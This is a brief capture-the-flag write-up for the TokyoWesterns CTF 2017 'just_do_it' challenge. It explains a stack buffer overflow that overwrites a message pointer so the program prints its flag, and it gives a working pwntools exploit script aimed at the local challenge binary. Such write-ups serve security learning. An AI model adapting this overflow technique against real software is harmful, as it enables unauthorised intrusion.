
# tw17_justdoit - TokyoWesterns CTF 2017 (Buffer Overflow Pointer Overwrite)

**Binary:** ELF 32-bit, not stripped
**Protections:** No canary, NX enabled, No PIE
**Vulnerability:** fgets(0x20) into 16-byte vulnBuf → overflow into `target` pointer (offset 20 bytes)

**Analysis:**

- Program reads flag.txt into global buffer at 0x0804a080
- vulnBuf [16] on stack
- Distance to target pointer: 20 bytes
- target points to "failed_message" by default
- Overwrite target with flag buffer address → puts(target) leaks flag

**Exploit:**

- Payload: 20 null bytes + p32(flag_addr) (0x0804a080)
- Leaks flag contents

**Pwntools Exploit:**

```python
from pwn import *

p = process('./just_do_it')

payload = b"\x00" * 20 + p32(0x0804a080)

p.sendline(payload)
print(p.recvall())
```
